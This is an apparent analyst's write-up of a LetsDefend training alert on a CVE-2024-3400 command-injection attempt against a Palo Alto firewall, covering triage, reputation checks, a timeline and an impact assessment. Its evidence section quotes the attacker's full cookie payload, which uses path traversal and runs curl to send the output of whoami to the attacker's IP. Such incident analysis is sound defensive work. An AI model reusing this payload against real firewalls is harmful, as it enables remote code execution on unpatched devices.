# Incident Investigation - [SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400)]
[https://app.letsdefend.io/case-management/casedetail/cfdeangelis/249]
> **Status:** Complete  
> **Date:** 2024-APR-18  
> **Platform:** LetsDefend
> **Severity:** Critical

---

# Objective


> Investigate a web attack (CVE-2024-3400) on an unpatched Palo Alto Firewall.  In this case, there was little evidence to support the attack was actually successful.  However, the firewall is vulerable to this attack type in the future and should be patched with ABSOLUTE urgency.

---

# Alert Information

| Field | Value |
|-------|-------|
| Alert Name | SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400) |
| Time Detected | 2024-APR-18 15:09 |
| Severity | Critical |
| Source IP | 144.172.79.92 |
| Destination IP | 172.16.17.139 |
| Source User | |
| Destination User | |
| Hostname | PA-Firewall-01 |
|Requested URL| 172.16.17.139/global-protect/login.esp|

---

# Initial Triage

## Questions

- What triggered the alert?

**Characteristics exploit pattern Detected on Cookie and Request, indicative exploitation of the CVE-2024-3400.**
- Is the source internal or external?

**External**
- Who owns the affected asset?

  **Firewall.  Ownded by security team**
- Is the activity expected?

  **No**
- What systems are involved?

  **Palo Alto firewall (172.16.17.139)**

### Initial Assessment

Palo Alto firewall (172.16.17.139) was targeted via command injection.  CVE-2024-3400 is a vulnerability applicable to certain PAN-OS versions.  Reviewing the Vendor Advisory, this firewall is indeed running an impacted OS version of PAN-OS 10.2.0 which could leave it subject to root-user level code execution.

---

# Investigation

## 1. Asset Identification

### Hostname

-PA-Firewall-01

### IP Address

-172.16.17.139

### Asset Owner

-Security team

### Last Logon

-2024-APR-18 07:05

---

## 2. Network Investigation

### Source

-144.172.79.92

### Destination

-172.16.17.139

### Reputation Checks

- VirusTotal
- AbuseIPDB
- Cisco Talos
- WHOIS / ASN

### Findings
-Source IP belongs to RouterHostingLLC (AS14956)
-AbuseIPDB reports an Unauthorized Scraping Attempt
-VirusTotal has much more comprehensive data, with many malicious/malware attempts reported
---

## 4. Endpoint Investigation

### Suspicious Processes

-None

### Command Line

No history

### File Activity

-None

### Registry Activity

-None

### Persistence

-No further communications or processes from 144.172.79.92

---

## 5. Timeline

| Time | Event |
|------|-------|
| 2024-APR-18 15:09:42 | 144.172.79.92 first communicates with our firewall |
| 2024-APR-18 15:09:42+ | Upon reviewing the endpoint, no further actions appear to have taken place afterwards |
| | |

---

## 6. Evidence Collected

### Indicators of Compromise

#### IP Addresses

- 144.172.79.92

#### Domains

- cloudzy.com

#### URLs

- 172.16.17.139/global-protect/login.esp

- this is a standard VPN login action.  Not necessary malicious

#### Cookie

- SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)

- this is the most suspect item.  This cookie attempts to traverse directories and run commands via the shell.  Inspection of the endpoint reveals no such processes ran.

---

# MITRE ATT&CK Mapping

| Technique | ID |
|-----------|----|
|Exploit Public-Facing Application | T1190|
|Command and Scripting Interpreter | T1059|

---

# Root Cause

> Device from cloudzy.com (144.172.79.92) sent an HTTP POST with a malicious cookie to PA-Firewall-01 (172.16.17.139).  The cookie was configured to traverse directories and test command execution of whoami via the shell.  The attempt failed.

---

# Impact Assessment

- Was the attack successful?
  **No**
- Was malware executed?
  **No**
- Was persistence established?
  **No**
- Was lateral movement observed?
  **No**
- Was data exfiltration observed?
  **No**

---

# Response Actions

- [ ] Block malicious IP/domain
- [ ] Isolate endpoint
- [ ] Reset credentials
- [ ] Remove malicious files
- [ ] Notify user
- [ ] Escalate to Tier 2

---

# Final Verdict

**Classification**

- False Positive

**Summary**

Device from cloudzy.com (144.172.79.92) sent an HTTP POST with a malicious cookie to PA-Firewall-01 (172.16.17.139).  The cookie was configured to traverse directories and test command execution of whoami via the shell.  The attempt failed.

---

# Lessons Learned

- What indicators were most useful?
- What detection logic caught the attack?
- What would you investigate next in a production environment?

---

# Skills Demonstrated

- Incident Triage
- Log Analysis
- Threat Hunting
- IOC Analysis
- PowerShell Analysis
- Windows Event Analysis
- Email Security
- Network Analysis
- Threat Intelligence
- MITRE ATT&CK Mapping
- Malware Analysis
